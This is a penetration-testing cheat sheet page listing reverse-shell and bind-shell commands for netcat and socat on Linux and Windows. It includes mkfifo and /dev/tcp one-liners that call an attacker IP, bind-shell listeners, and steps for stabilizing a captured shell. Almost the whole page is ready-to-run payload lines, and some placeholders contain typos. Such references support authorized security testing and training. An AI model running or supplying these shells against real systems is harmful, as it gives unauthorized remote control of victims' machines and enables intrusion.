---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
---

# Reverse Shell and Bind Shell Commands

### Netcat Reverse Shell

Reverse Shell Payload:&#x20;

```bash
## Windows
nc.exe 10.10.10.10 9001 -e powershell

## Linux
    ## nc mkfifo
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER-IP> 9001 >/tmp/f

    ## Bash -i
    /bin/bash -i >& /dev/tcp/<ATTCKER-IP>/9001 0>&1
```

Basic listener:&#x20;

```bash
sudo nc -lnvp <PORT>
```

### Netcat Bind Shell

Bind Shell Payload (Listener) for victim:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9001 > /tmp/f
```

Attacker run this command to get shell:

```bash
nc VICTIM_IP 9001
```

### Netcat Shell Stabilization:

```bash
sudo nc -lnvp <PORT>
python3 -c 'import pty;pty.spawn("/bin/bash")'
export  TERM=xterm
## Press CTRL+Z to background the process.
stty raw -echo; fg
```

> **Note:** If the shell is loss or dies, any input in your own (local) terminal will not be visible (as a result of having disable terminal echo). To fix this type `reset` and press Enter.

Another useful technique **(It is useful for getting reverse shell from Windows):**

```bash
sudo apt install rlwrap
rlwrap nc -lnvp <PORT>
## Press CTRL+Z to background the process.
stty raw -echo; fg
```

***

### Socket Reverse Shell

Reverse Shell Payloads:&#x20;

```ps
## Windows
socat TCP:<LOCAL-IP>:<LOCAP-PORT> EXEC:powershell.exe, pipes
## The pipes option is used to force PowerShell (or cmd.exe) to use Unix style standard input and output. 

## Linux
socat TCP:10.10.10.10:9001 EXEC:/bin/bash
```

Basic Listener:&#x20;

```bash
socat -d -d TCP-LISTEN:<PORT> STDOUT
```



The equivalent command for Linux target:

```bash
socat TCP-L:<LOCAL_IP>:<LOCAP-PORT> EXEC:"/bin/bash" -li
```

Bind Shell Command:

```ps
## Linux:
socat TCP-L:<PORT> EXEC:"bash" -li

## Windows
socat TCP-L:<PORT> EXEC:powershell.exe, pipes
```

